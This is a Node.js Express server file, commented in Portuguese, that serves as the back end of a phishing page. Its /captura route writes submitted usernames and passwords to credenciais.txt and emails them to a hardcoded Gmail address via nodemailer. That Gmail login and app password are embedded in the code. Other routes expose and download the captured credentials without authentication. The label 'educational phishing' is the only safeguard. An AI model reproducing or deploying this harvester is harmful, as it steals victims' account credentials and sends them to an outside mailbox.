const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const nodemailer = require('nodemailer');
const app = express();
const PORT = 3000;

app.use(bodyParser.json());
// Certifique-se de que seu arquivo HTML e outros estáticos estão na pasta 'public'
app.use(express.static('public'));

// --- Nodemailer Transporter Setup ---
// Certifique-se de que a senha é uma "senha de app" gerada pelo Google
// para sua conta joacarthurxavier60@gmail.com.
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'joacarthurxavier60@gmail.com',      // seu email
    pass: 'fode fnjj evgp zlf' // Sua senha de app (certifique-se que está correta)
  }
});

function enviarArquivoPorEmail(destinatario) {
  transporter.sendMail({
    from: 'joacarthurxavier60@gmail.com',
    to: destinatario,
    subject: 'Credenciais capturadas - EXECUTANDO PHISHING EDUCACIONAL', // Adicionei um aviso no assunto
    text: 'Segue em anexo o arquivo de credenciais capturadas. Isso é um exercício educacional de phishing.\n\nConteúdo do arquivo:\n' + fs.readFileSync('./credenciais.txt', 'utf8'), // Inclui o conteúdo no corpo
    attachments: [{ filename: 'credenciais.txt', path: './credenciais.txt' }]
  }, (err, info) => {
    if (err) {
      console.error('Erro ao enviar email:', err);
    } else {
      console.log('Email enviado:', info.response);
    }
  });
}

// Rota para capturar as credenciais (seu código original, com destinatário corrigido)
app.post('/captura', (req, res) => {
  const { usuario, senha } = req.body;
  const linha = `Usuário: ${usuario} | Senha: ${senha}\n`;
  fs.appendFileSync('credenciais.txt', linha, 'utf8');

  // Envia o arquivo automaticamente para seu email
  // CORREÇÃO: Destinatário agora é o seu email real.
  enviarArquivoPorEmail('joacarthurxavier60@gmail.com');
  res.json({ status: "sucesso" });
});

// NOVA ROTA: Para o frontend buscar e exibir as credenciais salvas
app.get('/credenciais', (req, res) => {
  try {
    const data = fs.readFileSync('credenciais.txt', 'utf8');
    const linhas = data.split('\n').filter(Boolean); // Divide por linha e remove entradas vazias
    const credenciais = linhas.map(linha => {
      const partes = linha.split(' | ');
      const usuario = partes[0] ? partes[0].replace('Usuário: ', '') : '';
      const senha = partes[1] ? partes[1].replace('Senha: ', '') : '';
      return { usuario, senha };
    });
    res.json(credenciais);
  } catch (err) {
    if (err.code === 'ENOENT') {
      res.json([]); // Retorna array vazio se o arquivo não existir ainda
    } else {
      console.error('Erro ao ler credenciais.txt:', err);
      res.status(500).json({ error: 'Erro interno do servidor ao ler credenciais.' });
    }
  }
});

// NOVA ROTA: Para baixar o arquivo de credenciais
app.get('/credenciais-arquivo', (req, res) => {
  const filePath = './credenciais.txt';
  fs.access(filePath, fs.constants.F_OK, (err) => {
    if (err) {
      // Arquivo não existe ou não pode ser acessado
      return res.status(404).send('Arquivo de credenciais não encontrado. Capture algumas credenciais primeiro!');
    }
    // Envia o arquivo para download
    res.download(filePath, 'credenciais.txt', (err) => {
      if (err) {
        console.error('Erro ao baixar arquivo:', err);
        // Se houver um erro durante o download (por exemplo, arquivo excluído), o usuário não verá nada
        // Você pode adicionar um log ou tratamento de erro mais robusto aqui se necessário.
        // res.status(500).send('Erro ao processar o download do arquivo.');
      }
    });
  });
});

app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
  console.log(`Certifique-se que o seu HTML está na pasta 'public'.`);
});